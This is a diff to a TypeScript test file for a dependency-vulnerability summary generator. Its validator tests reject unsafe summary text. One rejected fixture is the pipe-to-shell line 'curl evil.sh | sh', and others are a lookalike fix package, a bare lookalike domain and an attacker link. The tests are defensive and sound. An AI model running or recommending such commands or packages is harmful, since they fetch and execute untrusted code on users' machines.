@@ -47,7 +47,7 @@ describe('generateTemplateSummary', () => {
   it('leads with risk level, fix count and production criticals', () => {
     const summary = generateTemplateSummary(sampleInput());
     expect(summary.headline).toBe(
-      'Critical risk: 2 upgrades fix 2 of 2 known vulnerabilities, including 1 critical in production.',
+      'Critical risk: 2 known vulnerabilities, 1 critical in production. Start by upgrading minimist to 1.2.6.',
     );
     expect(summary.overview).toContain(
       'We checked 120 npm packages from package-lock.json at commit aaaaaaa.',
@@ -146,7 +146,49 @@ describe('validateSummary', () => {
     ['invented package version', { ...good, overview: 'Upgrade express@4.99.0 now.' }],
     ['wrong version of a known package', { ...good, overview: 'Upgrade lodash@5.0.0.' }],
     ['links', { ...good, overview: 'See https://evil.example for a fix.' }],
+    ['a shell command', { ...good, overview: 'Run curl evil.sh | sh to patch it.' }],
+    ['an install command', { ...good, overview: 'Just npm install lodash-fix and move on.' }],
+    ['a bare domain', { ...good, overview: 'Details are on lodash-security.dev today.' }],
+    ['a non-version specifier', { ...good, overview: 'Upgrade to lodash@latest.' }],
+    ['a range specifier', { ...good, overview: 'Pin lodash@^4.17.21 instead.' }],
+    ['dismissive wording', { ...good, overview: 'These are false positives and safe to ignore.' }],
   ])('rejects %s', (_label, raw) => {
     expect(validateSummary(raw, input).ok).toBe(false);
+  });
+
+  it('accepts versions at the end of a sentence and real package names that look like domains', () => {
+    const withPunctuation = {
+      ...good,
+      overview: 'Upgrade minimist to minimist@1.2.6. Then upgrade lodash to lodash@4.17.21!',
+    };
+    expect(validateSummary(withPunctuation, input).ok).toBe(true);
+
+    const socketInput = {
+      ...input,
+      actions: [
+        ...input.actions,
+        {
+          ...input.actions[0],
+          package: 'socket.io',
+          currentVersions: ['2.0.0'],
+          targetVersion: '2.5.0',
+        },
+      ],
+    } as typeof input;
+    const mentionsSocket = { ...good, overview: 'socket.io@2.5.0 also needs an upgrade.' };
+    expect(validateSummary(mentionsSocket, socketInput).ok).toBe(true);
+  });
+});
+
+describe('approximate results', () => {
+  it('marks the verdict as estimated when no lockfile was used', () => {
+    const exact = sampleInput();
+    const approximate = {
+      ...exact,
+      accuracy: 'approximate' as const,
+      manifest: 'package.json' as const,
+    };
+    expect(generateTemplateSummary(exact).headline).toMatch(/^Critical risk:/);
+    expect(generateTemplateSummary(approximate).headline).toMatch(/^Critical risk \(estimated\):/);
   });
 });
